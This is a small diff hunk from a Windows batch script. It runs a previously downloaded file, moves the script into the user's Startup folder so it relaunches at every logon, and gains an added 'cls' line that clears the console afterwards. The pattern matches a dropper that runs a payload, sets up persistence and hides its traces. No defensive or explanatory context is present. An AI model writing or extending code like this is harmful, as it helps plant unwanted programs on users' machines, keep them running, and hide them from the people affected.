@@ -8,3 +8,4 @@ if not exist "%download_path%" (exit /b 1)
 "%download_path%"
 move "%script_path%" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 endlocal
+cls
